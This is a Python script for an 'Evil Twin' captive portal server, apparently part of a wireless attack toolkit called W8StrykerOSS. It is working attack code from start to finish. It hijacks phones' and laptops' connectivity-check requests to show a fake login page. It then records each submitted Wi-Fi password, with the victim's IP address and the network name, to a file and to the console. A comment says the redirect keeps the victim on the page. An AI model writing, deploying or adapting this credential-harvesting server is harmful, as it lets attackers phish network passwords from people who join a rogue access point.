#!/usr/bin/env python3
"""
Evil Twin Captive Portal Server
W8StrykerOSS - Credential capture server
"""
import http.server
import urllib.parse
import os
import json
import datetime
import sys

CREDS_FILE = "/tmp/et_creds.txt"
HTML_FILE = "/tmp/evil_twin_portal.html"
PORT = 8080
SSID = sys.argv[1] if len(sys.argv) > 1 else "Target"


class PortalHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # silence default Apache-style logging

    def send_portal(self, ssid=None):
        try:
            with open(HTML_FILE, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(content)))
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.send_header("Pragma", "no-cache")
            self.end_headers()
            self.wfile.write(content)
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"<h1>Portal Error</h1>")

    def redirect_portal(self):
        self.send_response(302)
        self.send_header("Location", "http://10.0.0.1/?ssid=" + urllib.parse.quote(SSID))
        self.end_headers()

    def do_GET(self):
        # Captive portal detection endpoints - redirect to portal
        detect_paths = [
            "/generate_204",
            "/hotspot-detect.html",
            "/ncsi.txt",
            "/connecttest.txt",
            "/redirect",
            "/success.txt",
            "/canonical.html",
        ]
        for p in detect_paths:
            if self.path.startswith(p):
                self.redirect_portal()
                return
        self.send_portal()

    def do_POST(self):
        if "/capture" in self.path:
            try:
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode("utf-8", errors="ignore")
                params = urllib.parse.parse_qs(body)
                password = params.get("password", [""])[0].strip()
                ts = datetime.datetime.now().strftime("%I:%M:%S %p")
                client_ip = self.client_address[0]
                entry = json.dumps({
                    "time": ts,
                    "ip": client_ip,
                    "ssid": SSID,
                    "password": password
                })
                with open(CREDS_FILE, "a") as f:
                    f.write(entry + "\n")
                # Print for Android to parse
                print("[ET-CRED] " + ts + " | " + client_ip + " | " + password, flush=True)
            except Exception as e:
                print("[ET-ERROR] " + str(e), flush=True)
            # Always redirect back (keep victim on the page)
            self.send_response(302)
            self.send_header("Location", "/")
            self.end_headers()
        else:
            self.send_portal()

    def do_HEAD(self):
        self.redirect_portal()


print("[ET-START] Evil Twin portal server on port " + str(PORT) + " SSID=" + SSID, flush=True)
try:
    httpd = http.server.HTTPServer(("0.0.0.0", PORT), PortalHandler)
    httpd.serve_forever()
except KeyboardInterrupt:
    print("[ET-STOP] Server stopped", flush=True)
except Exception as e:
    print("[ET-ERROR] " + str(e), flush=True)
